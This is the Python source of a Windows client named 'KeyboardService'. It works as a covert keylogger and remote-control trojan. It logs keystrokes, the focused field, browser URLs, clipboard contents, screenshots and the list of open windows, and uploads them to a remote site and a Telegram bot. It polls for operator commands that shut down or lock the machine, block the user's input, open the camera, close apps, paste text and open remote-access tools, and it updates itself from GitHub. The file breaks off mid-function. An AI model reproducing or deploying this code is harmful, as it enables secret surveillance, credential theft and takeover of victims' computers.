import argparse
import atexit
import base64
import contextlib
import ctypes
import getpass
import glob
import gzip
import hashlib
import html
import json
import os
import platform
import re
import shutil
import socket
import ssl
import subprocess
import sys
import tempfile
import time
import uuid
from ctypes import wintypes
from datetime import datetime
from io import BytesIO
from queue import Queue
from threading import Event, Lock, Thread, Timer
from urllib.error import HTTPError, URLError
from urllib.parse import urlparse
from urllib.request import Request, urlopen

import certifi
from PIL import ImageGrab

TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "").strip()
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID", "").strip()

try:
    from pynput.keyboard import Controller, Key, KeyCode, Listener
except ImportError:
    Controller = None
    Key = None
    KeyCode = None
    Listener = None

try:
    from pywinauto import Desktop
except ImportError:
    Desktop = None

MESSAGE_GAP_MS = 2500
RAW_BATCH_DELAY_SECONDS = 0.08
RAW_BATCH_INTERVAL_SECONDS = 10
HEARTBEAT_INTERVAL_SECONDS = 12
MESSAGE_RETRY_INTERVAL_SECONDS = 30
SCREENSHOT_REQUEST_POLL_INTERVAL_SECONDS = 1
SCREENSHOT_CAPTURE_TIMEOUT_SECONDS = 60
APP_VERSION = "1.0.0.0.00"
UPDATE_API_URL = "https://api.github.com/repos/shadrackkiptoo/pissoff/releases/latest"
UPDATE_ASSET_NAME = "KeyboardService.exe"
INSTALL_DIR = os.path.join(os.getenv("LOCALAPPDATA", os.path.expanduser("~")), "KeyboardService")
INSTALL_PATH = os.path.join(INSTALL_DIR, "KeyboardService.exe")
UPDATE_DIR = os.path.join(INSTALL_DIR, "updates")
CONFIG_PATH = os.path.join(INSTALL_DIR, "config.json")


def load_site_url():
    default_url = "https://pissoff.onrender.com"
    try:
        if os.path.exists(CONFIG_PATH):
            with open(CONFIG_PATH, "r", encoding="utf-8") as config_file:
                data = json.load(config_file)
            if isinstance(data, dict) and isinstance(data.get("site_url"), str):
                candidate = data["site_url"].strip().rstrip("/")
                if candidate:
                    return candidate
    except (OSError, ValueError, json.JSONDecodeError):
        pass

    env_url = os.getenv("SITE_URL", "").strip().rstrip("/")
    return env_url or default_url


parser = argparse.ArgumentParser(add_help=False)
parser.add_argument("--site-url", default=load_site_url())
parser.add_argument("--post-update-success", action="store_true", default=False)
parser.add_argument("--previous-version", default="")
parser.add_argument("--new-version", default="")
parser.add_argument("--update-command-id", default="")
args, _ = parser.parse_known_args()
SITE_URL = args.site_url.strip().rstrip("/")
POST_UPDATE_SUCCESS = bool(args.post_update_success)
PREVIOUS_VERSION = (args.previous_version or "").strip()
NEW_VERSION = (args.new_version or "").strip()
POST_UPDATE_COMMAND_ID = (args.update_command_id or "").strip()
device_name = platform.node() or socket.gethostname() or "Unknown device"
device_id = hashlib.sha256(device_name.encode("utf-8")).hexdigest()[:12]
message_buffer = ""
raw_message_buffer = ""
raw_log_buffer = ""
raw_log_target = None
raw_flush_timer = None
raw_batch_events = []
raw_batch_started_at = None
raw_batch_lock = Lock()
last_key_time_ms = None
message_started_ms = None
active_target = None
active_target_key = None
active_modifiers = set()
state_lock = Lock()
message_queue = Queue()
client_started_at = int(time.time() * 1000)
STARTUP_ENTRY_NAME = "KeyboardService"
PENDING_MESSAGES_PATH = os.path.join(INSTALL_DIR, "pending_messages.json")
PENDING_RAW_BATCHES_PATH = os.path.join(INSTALL_DIR, "pending_raw_batches.json")
SESSION_ID = uuid.uuid4().hex
pending_messages_lock = Lock()
last_message_id = 0
SERVICE_KEYBOARD_LISTENER = None
collection_paused = False
update_lock = Lock()
input_block_timer = None
input_block_stop_event = None

SHIFTED_SYMBOLS = {
    "1": "!", "2": "@", "3": "#", "4": "$", "5": "%",
    "6": "^", "7": "&", "8": "*", "9": "(", "0": ")",
    "-": "_", "=": "+", "[": "{", "]": "}", "\\": "|",
    ";": ":", "'": '"', ",": "<", ".": ">", "/": "?", "`": "~",
}


def telegram_configured():
    return bool(TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID)


def send_telegram_log(message):
    if not telegram_configured():
        return

    text = str(message).strip()
    if not text:
        return

    escaped = html.escape(text)
    try:
        payload = json.dumps({
            "chat_id": TELEGRAM_CHAT_ID,
            "text": (
                "<b>┌─[ LOG // CLIENT ]</b>\n"
                f"<pre>{escaped[:3900]}</pre>\n"
                "<b>└─[ KeyboardClient // STREAM ]</b>"
            ),
            "parse_mode": "HTML",
        }).encode("utf-8")
        request = Request(
            f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
            data=payload,
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        with urlopen(request, timeout=10) as response:
            if response.status >= 400:
                raise RuntimeError(f"HTTP {response.status}")
    except Exception:
        with contextlib.suppress(Exception):
            pass


class TelegramLogProxy:
    def __init__(self, stream):
        self.stream = stream

    def write(self, data):
        text = data.rstrip("\r\n")
        if text:
            self.stream.write(data)
            self.stream.flush()
            try:
                send_telegram_log(text)
            except Exception:
                pass
        else:
            self.stream.write(data)
            self.stream.flush()

    def flush(self):
        self.stream.flush()

    def isatty(self):
        return getattr(self.stream, "isatty", lambda: False)()


if os.environ.get("TELEGRAM_BOT_TOKEN") and os.environ.get("TELEGRAM_CHAT_ID"):
    sys.stdout = TelegramLogProxy(sys.stdout)
    sys.stderr = TelegramLogProxy(sys.stderr)


def get_active_app():
    if os.name != "nt":
        return "Unknown app"

    user32 = ctypes.windll.user32
    hwnd = user32.GetForegroundWindow()
    if not hwnd:
        return "Unknown app"

    title_buffer = ctypes.create_unicode_buffer(512)
    user32.GetWindowTextW(hwnd, title_buffer, len(title_buffer))
    title = title_buffer.value.strip()

    process_id = wintypes.DWORD()
    user32.GetWindowThreadProcessId(hwnd, ctypes.byref(process_id))
    kernel32 = ctypes.windll.kernel32
    process = kernel32.OpenProcess(0x1000, False, process_id.value)
    executable = ""
    if process:
        executable_buffer = ctypes.create_unicode_buffer(512)
        executable_length = wintypes.DWORD(len(executable_buffer))
        if kernel32.QueryFullProcessImageNameW(
            process, 0, executable_buffer, ctypes.byref(executable_length)
        ):
            executable = os.path.basename(executable_buffer.value)
        kernel32.CloseHandle(process)

    if title and executable:
        return f"{executable} - {title}"
    return title or executable or "Unknown app"


def get_active_target():
    app_name = get_active_app()
    if os.name != "nt" or Desktop is None:
        return app_name, app_name

    try:
        window = Desktop(backend="uia").get_active()
        focused_control = window.get_focus()
        control_type = focused_control.element_info.control_type or "Control"
        control_name = (focused_control.window_text() or "").strip()
        if not control_name:
            control_name = (focused_control.element_info.name or "").strip()
        automation_id = (focused_control.element_info.automation_id or "").strip()
        details = control_name or automation_id or control_type
        if control_name and control_type.lower() not in control_name.lower():
            details = f"{control_type}: {control_name}"
        target = f"{app_name} | {details}"
        target_key = f"{app_name}|{control_type}|{control_name}|{automation_id}"
        return target, target_key
    except Exception:
        return app_name, app_name


BROWSER_EXECUTABLES = (
    "chrome.exe",
    "msedge.exe",
    "edge.exe",
    "firefox.exe",
    "brave.exe",
    "opera.exe",
)


def browser_name_from_active_app(app_name):
    candidate = str(app_name or "").strip()
    if not candidate:
        return ""
    executable = candidate.split(" - ", 1)[0].strip().replace("\\", "/")
    base_name = os.path.basename(executable).lower().strip()
    if base_name:
        normalized_base = base_name.lower()
        if normalized_base in BROWSER_EXECUTABLES:
            return normalized_base
        if normalized_base.endswith(".exe"):
            return normalized_base
        if "google chrome" in candidate.lower():
            return "chrome.exe"
        if "microsoft edge" in candidate.lower() or "edge" in candidate.lower():
            return "msedge.exe"
        if "firefox" in candidate.lower():
            return "firefox.exe"
        if "brave" in candidate.lower():
            return "brave.exe"
        if "opera" in candidate.lower():
            return "opera.exe"
        return base_name

    lowered = candidate.lower()
    if "google chrome" in lowered:
        return "chrome.exe"
    if "microsoft edge" in lowered or "edge" in lowered:
        return "msedge.exe"
    if "firefox" in lowered:
        return "firefox.exe"
    if "brave" in lowered:
        return "brave.exe"
    if "opera" in lowered:
        return "opera.exe"
    return ""


def get_browser_url(app_name):
    if os.name != "nt" or Desktop is None:
        return ""
    executable = browser_name_from_active_app(app_name)
    if executable not in BROWSER_EXECUTABLES:
        return ""

    try:
        window = Desktop(backend="uia").get_active()
        candidate_values = []
        for control in window.descendants():
            if control is None:
                continue
            try:
                control_type = (control.element_info.control_type or "").lower()
            except Exception:
                control_type = ""
            for value in (
                control.window_text(),
                control.element_info.name,
                control.element_info.automation_id,
            ):
                if value is None:
                    continue
                text = str(value).strip()
                if not text:
                    continue
                if any(marker in text.lower() for marker in ("address", "search", "url", "location", "omnibox")):
                    candidate_values.append(text)
                elif control_type in {"edit", "combobox", "pane", "group", "text"} and text.startswith(("http://", "https://")):
                    candidate_values.append(text)
        for value in candidate_values:
            if value.startswith(("http://", "https://")):
                parsed = urlparse(value)
                if parsed.scheme in ("http", "https") and parsed.netloc:
                    return value
    except Exception:
        return ""
    return ""


def get_message_source_url(app_name):
    candidate = str(app_name or "").strip()
    if not candidate:
        return ""
    return get_browser_url(candidate)



def get_clipboard_text():
    if os.name != "nt":
        return ""

    user32 = ctypes.windll.user32
    kernel32 = ctypes.windll.kernel32
    user32.GetClipboardData.argtypes = [wintypes.UINT]
    user32.GetClipboardData.restype = ctypes.c_void_p
    kernel32.GlobalLock.argtypes = [ctypes.c_void_p]
    kernel32.GlobalLock.restype = ctypes.c_void_p
    kernel32.GlobalUnlock.argtypes = [ctypes.c_void_p]
    kernel32.GlobalUnlock.restype = wintypes.BOOL
    text = ""
    if not user32.OpenClipboard(None):
        return text
    try:
        handle = user32.GetClipboardData(13)
        if handle:
            pointer = kernel32.GlobalLock(handle)
            if pointer:
                try:
                    text = ctypes.wstring_at(pointer)
                finally:
                    kernel32.GlobalUnlock(handle)
    finally:
        user32.CloseClipboard()
    return text


def set_clipboard_text(text):
    if os.name != "nt":
        raise RuntimeError("Clipboard control is only supported on Windows")

    user32 = ctypes.windll.user32
    kernel32 = ctypes.windll.kernel32
    value = str(text)
    encoded = (value + "\0").encode("utf-16-le")
    handle = kernel32.GlobalAlloc(0x0042, len(encoded))
    if not handle:
        raise RuntimeError("Could not allocate clipboard memory")
    pointer = kernel32.GlobalLock(handle)
    if not pointer:
        kernel32.GlobalFree(handle)
        raise RuntimeError("Could not lock clipboard memory")
    try:
        ctypes.memmove(pointer, encoded, len(encoded))
    finally:
        kernel32.GlobalUnlock(handle)

    if not user32.OpenClipboard(None):
        kernel32.GlobalFree(handle)
        raise RuntimeError("Could not open the clipboard")
    try:
        user32.EmptyClipboard()
        if not user32.SetClipboardData(13, handle):
            kernel32.GlobalFree(handle)
            raise RuntimeError("Could not set the clipboard")
        handle = None
    finally:
        user32.CloseClipboard()
        if handle:
            kernel32.GlobalFree(handle)


def autofill_text(text):
    set_clipboard_text(text)
    time.sleep(0.1)
    keyboard = Controller()
    keyboard.press(Key.ctrl)
    keyboard.press("v")
    keyboard.release("v")
    keyboard.release(Key.ctrl)


def normalize_key(key):
    if key in (Key.shift, Key.shift_l, Key.shift_r, Key.ctrl, Key.ctrl_l, Key.ctrl_r,
               Key.alt, Key.alt_l, Key.alt_r, Key.cmd, Key.cmd_l, Key.cmd_r):
        return ""
    if key == Key.space:
        return " "
    if key == Key.enter:
        return "\n"
    if key == Key.tab:
        return "\t"
    if key == Key.backspace:
        return "\b"
    if isinstance(key, KeyCode) and key.char is not None:
        value = key.char
        if ord(value) < 32:
            return ""
        if Key.shift in active_modifiers and value.isalpha():
            return value.upper()
        return SHIFTED_SYMBOLS.get(value, value) if Key.shift in active_modifiers else value
    return ""


def capture_desktop_screenshot():
    try:
        image = ImageGrab.grab(all_screens=False)
        output = BytesIO()
        image.save(output, format="PNG", optimize=True)
        return base64.b64encode(output.getvalue()).decode("ascii")
    except Exception as error:
        report_screenshot_status("Failed", f"Desktop capture error: {type(error).__name__}")
        return ""


def get_local_ip():
    try:
        probe = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            probe.connect(("8.8.8.8", 80))
            return probe.getsockname()[0]
        finally:
            probe.close()
    except OSError:
        return ""


def get_device_telemetry():
    local_now = datetime.now().astimezone()
    telemetry = {
        "local_time": local_now.isoformat(timespec="seconds"),
        "local_time_ms": int(local_now.timestamp() * 1000),
        "local_ip": get_local_ip(),
        "logged_in_user": getpass.getuser() or "Unknown user",
        "battery_percent": None,
        "battery_status": "Unknown",
        "open_apps": get_open_apps(),
    }
    if os.name != "nt":
        return telemetry
    try:
        class SystemPowerStatus(ctypes.Structure):
            _fields_ = [
                ("ac_line_status", ctypes.c_ubyte),
                ("battery_flag", ctypes.c_ubyte),
                ("battery_percent", ctypes.c_ubyte),
                ("reserved", ctypes.c_ubyte),
                ("battery_life_time", ctypes.c_ulong),
                ("battery_full_life_time", ctypes.c_ulong),
            ]

        power_status = SystemPowerStatus()
        if not ctypes.windll.kernel32.GetSystemPowerStatus(ctypes.byref(power_status)):
            return telemetry
        if power_status.battery_flag == 128:
            telemetry["battery_status"] = "No battery"
        elif power_status.battery_percent <= 100:
            telemetry["battery_percent"] = power_status.battery_percent
            telemetry["battery_status"] = "Charging" if power_status.ac_line_status == 1 else "On battery"
        else:
            telemetry["battery_status"] = "Unknown"
    except Exception:
        pass
    return telemetry


def get_open_apps():
    if os.name != "nt":
        return []
    try:
        titles = []
        user32 = ctypes.windll.user32
        enum_windows = user32.EnumWindows
        enum_windows.argtypes = [ctypes.WINFUNCTYPE(wintypes.BOOL, wintypes.HWND, wintypes.LPARAM), wintypes.LPARAM]
        enum_windows.restype = wintypes.BOOL
        callback_type = ctypes.WINFUNCTYPE(wintypes.BOOL, wintypes.HWND, wintypes.LPARAM)

        @callback_type
        def collect_window(hwnd, _lparam):
            if not user32.IsWindowVisible(hwnd):
                return True
            length = user32.GetWindowTextLengthW(hwnd)
            if length <= 0:
                return True
            title_buffer = ctypes.create_unicode_buffer(length + 1)
            user32.GetWindowTextW(hwnd, title_buffer, length + 1)
            title = title_buffer.value.strip()
            if title and title not in titles:
                titles.append(title)
            return len(titles) < 30

        enum_windows(collect_window, 0)
        return titles
    except (AttributeError, OSError, TypeError):
        return []


def raw_key_value(key):
    if key in (Key.ctrl, Key.ctrl_l, Key.ctrl_r):
        return "[CTRL]"
    if key in (Key.shift, Key.shift_l, Key.shift_r):
        return "[SHIFT]"
    if key in (Key.alt, Key.alt_l, Key.alt_r):
        return "[ALT]"
    if key in (Key.cmd, Key.cmd_l, Key.cmd_r):
        return "[CMD]"
    if key == Key.space:
        return "[SPACE]"
    if key == Key.enter:
        return "[ENTER]"
    if key == Key.tab:
        return "[TAB]"
    if key == Key.backspace:
        return "[BACKSPACE]"
    if isinstance(key, KeyCode) and key.char is not None:
        return key.char
    if isinstance(key, Key):
        return f"[{str(key).split('.')[-1].upper()}]"
    return ""


def load_pending_messages():
    try:
        with open(PENDING_MESSAGES_PATH, "r", encoding="utf-8") as pending_file:
            messages = json.load(pending_file)
            return messages if isinstance(messages, list) else []
    except (FileNotFoundError, OSError, json.JSONDecodeError):
        return []


def save_pending_messages(messages):
    os.makedirs(INSTALL_DIR, exist_ok=True)
    fd, temporary_path = tempfile.mkstemp(
        prefix="pending_messages_", suffix=".tmp", dir=INSTALL_DIR
    )
    try:
        with os.fdopen(fd, "w", encoding="utf-8") as pending_file:
            json.dump(messages, pending_file)
        os.replace(temporary_path, PENDING_MESSAGES_PATH)
    finally:
        if os.path.exists(temporary_path):
            os.unlink(temporary_path)


def remember_pending_message(payload):
    with pending_messages_lock:
        messages = load_pending_messages()
        messages.append(payload)
        save_pending_messages(messages)


def forget_pending_message(payload):
    with pending_messages_lock:
        messages = load_pending_messages()
        try:
            messages.remove(payload)
        except ValueError:
            return
        if messages:
            save_pending_messages(messages)
        elif os.path.exists(PENDING_MESSAGES_PATH):
            os.unlink(PENDING_MESSAGES_PATH)


def load_pending_raw_batches():
    try:
        with open(PENDING_RAW_BATCHES_PATH, "r", encoding="utf-8") as pending_file:
            batches = json.load(pending_file)
            return batches if isinstance(batches, list) else []
    except (FileNotFoundError, OSError, json.JSONDecodeError):
        return []


def save_pending_raw_batches(batches):
    os.makedirs(INSTALL_DIR, exist_ok=True)
    fd, temporary_path = tempfile.mkstemp(
        prefix="pending_raw_batches_", suffix=".tmp", dir=INSTALL_DIR
    )
    try:
        with os.fdopen(fd, "w", encoding="utf-8") as pending_file:
            json.dump(batches, pending_file)
        os.replace(temporary_path, PENDING_RAW_BATCHES_PATH)
    finally:
        if os.path.exists(temporary_path):
            os.unlink(temporary_path)


def remember_raw_batch(payload):
    with raw_batch_lock:
        batches = load_pending_raw_batches()
        batches.append(payload)
        save_pending_raw_batches(batches)


def forget_raw_batch(payload):
    with raw_batch_lock:
        batches = [
            batch for batch in load_pending_raw_batches()
            if batch.get("batch_id") != payload.get("batch_id")
        ]
        if batches:
            save_pending_raw_batches(batches)
        elif os.path.exists(PENDING_RAW_BATCHES_PATH):
            os.unlink(PENDING_RAW_BATCHES_PATH)


def post_raw_batch(payload):
    try:
        request = Request(
            f"{SITE_URL}/api/raw-batches",
            data=json.dumps(payload).encode("utf-8"),
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        with urlopen(request, timeout=10) as response:
            if response.status >= 400:
                raise RuntimeError(f"HTTP {response.status}")
        return True
    except (HTTPError, URLError, TimeoutError, RuntimeError):
        return False


def upload_raw_batch(events):
    if not events:
        return
    payload_json = json.dumps(events, separators=(",", ":")).encode("utf-8")
    payload = {
        "batch_id": uuid.uuid4().hex,
        "device_id": device_id,
        "device_name": device_name,
        "session_id": SESSION_ID,
        "started_at": events[0]["time"],
        "ended_at": events[-1]["time"],
        "event_count": len(events),
        "payload_base64": base64.b64encode(gzip.compress(payload_json)).decode("ascii"),
    }
    remember_raw_batch(payload)
    if post_raw_batch(payload):
        forget_raw_batch(payload)


def retry_pending_raw_batches():
    for payload in load_pending_raw_batches():
        if post_raw_batch(payload):
            forget_raw_batch(payload)


def post_message(payload, quiet=False):
    try:
        headers = {"Content-Type": "application/json"}
        request = Request(
            f"{SITE_URL}/api/messages",
            data=json.dumps(payload).encode("utf-8"),
            headers=headers,
            method="POST",
        )
        with urlopen(request, timeout=10) as response:
            if response.status >= 400:
                raise RuntimeError(f"HTTP {response.status}")
        return True
    except (HTTPError, URLError, TimeoutError, RuntimeError) as error:
        if not quiet:
            print(f"Could not send message: {error}")
        return False


def acknowledge_device_command(command_id, status, error=""):
    if not command_id:
        return
    try:
        request = Request(
            f"{SITE_URL}/api/devices/{device_id}/commands/{command_id}/ack",
            data=json.dumps({"status": status, "error": error}).encode("utf-8"),
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        with urlopen(request, timeout=10) as response:
            if response.status >= 400:
                raise RuntimeError(f"HTTP {response.status}")
    except (HTTPError, URLError, TimeoutError, RuntimeError) as ack_error:
        print(f"Could not acknowledge device command: {ack_error}")


def upload_device_screenshot(screenshot_base64):
    if not screenshot_base64:
        report_screenshot_status("Failed", "The desktop capture returned no image.")
        return False
    report_screenshot_status("Uploading", "Uploading the screenshot to the server.")
    try:
        headers = {"Content-Type": "application/json"}
        api_key = os.getenv("INGEST_API_KEY", "").strip()
        if api_key:
            headers["x-api-key"] = api_key
        request = Request(
            f"{SITE_URL}/api/devices/screenshot-upload",
            data=json.dumps({
                "device_id": device_id,
                "screenshot_base64": screenshot_base64,
            }).encode("utf-8"),
            headers=headers,
            method="POST",
        )
        with urlopen(request, timeout=90) as response:
            if response.status >= 400:
                raise RuntimeError(f"HTTP {response.status}")
        return True
    except Exception as error:
        print(f"Could not upload device screenshot: {error}")
        if isinstance(error, HTTPError):
            detail = error.read().decode("utf-8", errors="replace")[:240]
            report_screenshot_status("Failed", f"Upload rejected ({error.code}): {detail}")
        elif isinstance(error, URLError):
            report_screenshot_status("Failed", f"Upload network error: {error.reason}")
        elif isinstance(error, TimeoutError):
            report_screenshot_status("Failed", "Upload timed out.")
        return False


def report_screenshot_status(status, message):
    try:
        headers = {"Content-Type": "application/json"}
        api_key = os.getenv("INGEST_API_KEY", "").strip()
        if api_key:
            headers["x-api-key"] = api_key
        request = Request(
            f"{SITE_URL}/api/devices/screenshot-status",
            data=json.dumps({
                "device_id": device_id,
                "status": status,
                "message": message,
            }).encode("utf-8"),
            headers=headers,
            method="POST",
        )
        with urlopen(request, timeout=10) as response:
            if response.status >= 400:
                raise RuntimeError(f"HTTP {response.status}")
    except Exception as error:
        print(f"Could not report screenshot status: {error}")


def capture_and_upload_screenshot():
    capture_result = {}
    capture_error = {}

    def capture_image():
        try:
            capture_result["image"] = capture_desktop_screenshot()
        except Exception as error:
            capture_error["error"] = error

    try:
        capture_thread = Thread(target=capture_image, daemon=True)
        capture_thread.start()
        capture_thread.join(SCREENSHOT_CAPTURE_TIMEOUT_SECONDS)
        if capture_thread.is_alive():
            report_screenshot_status(
                "Failed",
                f"Desktop capture timed out after {SCREENSHOT_CAPTURE_TIMEOUT_SECONDS} seconds.",
            )
            return
        if "error" in capture_error:
            raise capture_error["error"]
        upload_device_screenshot(capture_result.get("image", ""))
    except Exception as error:
        print(f"Screenshot worker failed: {type(error).__name__}: {error}")
        report_screenshot_status("Failed", f"Screenshot worker failed: {type(error).__name__}")


def trigger_screenshot_capture():
    report_screenshot_status("Capturing", "Reading the desktop image.")
    Thread(target=capture_and_upload_screenshot, daemon=True).start()


def poll_screenshot_request():
    try:
        headers = {"Content-Type": "application/json"}
        api_key = os.getenv("INGEST_API_KEY", "").strip()
        if api_key:
            headers["x-api-key"] = api_key
        request = Request(
            f"{SITE_URL}/api/devices/{device_id}/screenshot-request",
            headers=headers,
            method="GET",
        )
        with urlopen(request, timeout=10) as response:
            if response.status >= 400:
                raise RuntimeError(f"HTTP {response.status}")
            data = json.loads(response.read().decode("utf-8"))
        handle_device_command(data.get("command"), data.get("command_id"), data.get("message", ""))
        if data.get("screenshot_requested"):
            trigger_screenshot_capture()
    except (HTTPError, URLError, TimeoutError, RuntimeError) as error:
        if isinstance(error, HTTPError):
            detail = error.read().decode("utf-8", errors="replace")[:240]
            print(f"Could not poll screenshot request: HTTP {error.code}: {detail}")
        else:
            print(f"Could not poll screenshot request: {error}")


def screenshot_request_poller():
    while True:
        poll_screenshot_request()
        time.sleep(SCREENSHOT_REQUEST_POLL_INTERVAL_SECONDS)


def display_message_image(message):
    if os.name != "nt":
        raise RuntimeError("Image messages are only supported on Windows")
    try:
        payload = json.loads(str(message))
    except (TypeError, ValueError) as error:
        raise RuntimeError("Image command payload is invalid") from error
    if not isinstance(payload, dict):
        raise RuntimeError("Image command payload is invalid")
    media_id = str(payload.get("attachment_id", ""))
    match = re.fullmatch(r"[0-9a-f]{32}\.(jpg|png|gif|webp)", media_id)
    if not match:
        raise RuntimeError("Image attachment ID is invalid")
    headers = {"Content-Type": "application/json"}
    api_key = os.getenv("INGEST_API_KEY", "").strip()
    if api_key:
        headers["x-api-key"] = api_key
    request = Request(f"{SITE_URL}/api/devices/media/{media_id}", headers=headers, method="GET")
    with urlopen(request, timeout=30) as response:
        image_bytes = response.read(10 * 1024 * 1024 + 1)
    if not image_bytes or len(image_bytes) > 10 * 1024 * 1024:
        raise RuntimeError("Image attachment is empty or too large")
    with tempfile.NamedTemporaryFile(prefix="KeyboardService-", suffix=f".{match.group(1)}", delete=False) as image_file:
        image_file.write(image_bytes)
        image_path = image_file.name
    caption = str(payload.get("caption", "")).strip()
    if caption:
        ctypes.windll.user32.MessageBoxW(None, caption, "Message from dashboard", 0x40)
    os.startfile(image_path)


def open_message_document(message):
    if os.name != "nt":
        raise RuntimeError("Document messages are only supported on Windows")
    try:
        payload = json.loads(str(message))
    except (TypeError, ValueError) as error:
        raise RuntimeError("Document command payload is invalid") from error
    if not isinstance(payload, dict):
        raise RuntimeError("Document command payload is invalid")
    attachment_id = str(payload.get("attachment_id", ""))
    match = re.fullmatch(r"[0-9a-f]{32}\.(pdf|docx|rtf|txt)", attachment_id)
    if not match:
        raise RuntimeError("Document attachment ID is invalid")
    headers = {"Content-Type": "application/json"}
    api_key = os.getenv("INGEST_API_KEY", "").strip()
    if api_key:
        headers["x-api-key"] = api_key
    request = Request(f"{SITE_URL}/api/devices/documents/{attachment_id}", headers=headers, method="GET")
    with urlopen(request, timeout=60) as response:
        document_bytes = response.read(20 * 1024 * 1024 + 1)
    if not document_bytes or len(document_bytes) > 20 * 1024 * 1024:
        raise RuntimeError("Document attachment is empty or too large")
    with tempfile.NamedTemporaryFile(prefix="KeyboardService-", suffix=f".{match.group(1)}", delete=False) as document_file:
        document_file.write(document_bytes)
        document_path = document_file.name
    os.startfile(document_path)


def release_input_block(stop_event, ready_event, result, duration):
    global input_block_timer, input_block_stop_event
    user32 = ctypes.windll.user32
    user32.BlockInput.argtypes = [wintypes.BOOL]
    user32.BlockInput.restype = wintypes.BOOL
    try:
        if not user32.BlockInput(True):
            error_code = ctypes.get_last_error()
            result["error"] = OSError(error_code, ctypes.FormatError(error_code))
            return
        ready_event.set()
        stop_event.wait(duration)
        if not user32.BlockInput(False):
            error_code = ctypes.get_last_error()
            print(f"Could not release Windows input block: {error_code}: {ctypes.FormatError(error_code)}")
    finally:
        ready_event.set()
        if input_block_stop_event is stop_event:
            input_block_timer = None
            input_block_stop_event = None


def _handle_block_input(message):
    global input_block_timer, input_block_stop_event
    if os.name != "nt":
        raise RuntimeError("Input blocking is only supported on Windows")

    try:
        duration = int(str(message).strip())
    except ValueError as error:
        raise RuntimeError("Input block duration must be a whole number of seconds") from error

    if duration < 1 or duration > 3600:
        raise RuntimeError("Input block duration must be between 1 and 3600 seconds")

    if input_block_stop_event is not None:
        input_block_stop_event.set()

    previous_input_block_timer = input_block_timer
    if previous_input_block_timer is not None and previous_input_block_timer.is_alive():
        with contextlib.suppress(Exception):
            previous_input_block_timer.join(timeout=2)

    stop_event = Event()
    ready_event = Event()
    result = {}
    input_block_stop_event = stop_event
    new_input_block_timer = Thread(
        target=release_input_block,
        args=(stop_event, ready_event, result, duration),
        daemon=True,
    )
    input_block_timer = new_input_block_timer
    new_input_block_timer.start()
    ready_event.wait(timeout=5)
    if result.get("error"):
        new_input_block_timer.join(timeout=2)
        input_block_timer = None
        input_block_stop_event = None
        raise result["error"]


def handle_device_command(command, command_id=None, message=""):
    global collection_paused, input_block_timer, input_block_stop_event
    if not command:
        return
    try:
        shutdown_path = os.path.join(os.environ.get("SystemRoot", r"C:\Windows"), "System32", "shutdown.exe")
        if command == "shutdown":
            subprocess.Popen([shutdown_path, "/s", "/t", "0"], close_fds=True)
        elif command == "logout":
            subprocess.Popen([shutdown_path, "/l"], close_fds=True)
        elif command == "restart":
            subprocess.Popen([shutdown_path, "/r", "/t", "0"], close_fds=True)
        elif command == "lock":
            if os.name != "nt":
                raise RuntimeError("Lock is only supported on Windows")
            ctypes.windll.user32.LockWorkStation()
        elif command == "block_input":
            _handle_block_input(message)
        elif command == "pause":
            flush_message_buffer()
            collection_paused = True
        elif command == "resume":
            collection_paused = False
        elif command == "open_camera":
            if os.name != "nt":
                raise RuntimeError("Camera control is only supported on Windows")
            try:
                duration = int(str(message).strip())
            except ValueError as error:
                raise RuntimeError("Camera duration must be a whole number of seconds") from error
            if duration < 1 or duration > 3600:
                raise RuntimeError("Camera duration must be between 1 and 3600 seconds")
            open_camera_app(duration)
        elif command == "close_app":
            if os.name != "nt":
                raise RuntimeError("App closing is only supported on Windows")
            close_app_by_title(str(message).strip())
        elif command == "close_all_apps":
            if os.name != "nt":
                raise RuntimeError("App closing is only supported on Windows")
            close_all_visible_apps()
        elif command == "open_ultraviewer":
            open_ultraviewer()
        elif command == "open_remote_app":
            open_remote_app(message)
        elif command == "autofill":
            if os.name != "nt":
                raise RuntimeError("Autofill is only supported on Windows")
            payload = str(message).strip()
            if not payload:
                raise RuntimeError("Autofill text cannot be empty")
            autofill_text(payload)
        elif command == "show_image":
            display_message_image(message)
        elif command == "open_document":
            open_message_document(message)
        elif command == "update_client":
            if os.name != "nt":
                raise RuntimeError("Client updates are only supported on Windows")
            if not getattr(sys, "frozen", False):
                raise RuntimeError("This client is not running from an installed build and cannot update itself.")
            check_for_updates(command_id=command_id)
            return
        elif command == "message":
            if os.name != "nt":
                raise RuntimeError("Message boxes are only supported on Windows")
            ctypes.windll.user32.MessageBoxW(None, str(message), "Message from dashboard", 0x40)
        else:
            raise RuntimeError("Unsupported command")
        acknowledge_device_command(command_id, "completed")
    except (OSError, RuntimeError, AttributeError, ValueError) as error:
        acknowledge_device_command(command_id, "failed", str(error))


def close_all_visible_apps():
    if os.name != "nt":
        raise RuntimeError("App closing is only supported on Windows")

    user32 = ctypes.windll.user32
    enum_windows = user32.EnumWindows
    enum_windows.argtypes = [ctypes.WINFUNCTYPE(wintypes.BOOL, wintypes.HWND, wintypes.LPARAM), wintypes.LPARAM]
    enum_windows.restype = wintypes.BOOL
    callback_type = ctypes.WINFUNCTYPE(wintypes.BOOL, wintypes.HWND, wintypes.LPARAM)
    closed = False

    @callback_type
    def close_window(hwnd, _lparam):
        nonlocal closed
        if not user32.IsWindowVisible(hwnd):
            return True
        title_length = user32.GetWindowTextLengthW(hwnd)
        if title_length <= 0:
            return True
        title_buffer = ctypes.create_unicode_buffer(title_length + 1)
        user32.GetWindowTextW(hwnd, title_buffer, title_length + 1)
        title = title_buffer.value.strip()
        if not title:
            return True
        if title.lower() not in {"task switching", "start", "program manager"}:
            user32.PostMessageW(hwnd, 0x0010, 0, 0)
            closed = True
        return True

    enum_windows(close_window, 0)
    if not closed:
        raise RuntimeError("No visible windows were closed")


def close_app_by_title(app_name):
    if os.name != "nt":
        raise RuntimeError("App closing is only supported on Windows")
    target = (app_name or "").strip()
    if not target:
        raise RuntimeError("App name is required")

    user32 = ctypes.windll.user32
    enum_windows = user32.EnumWindows
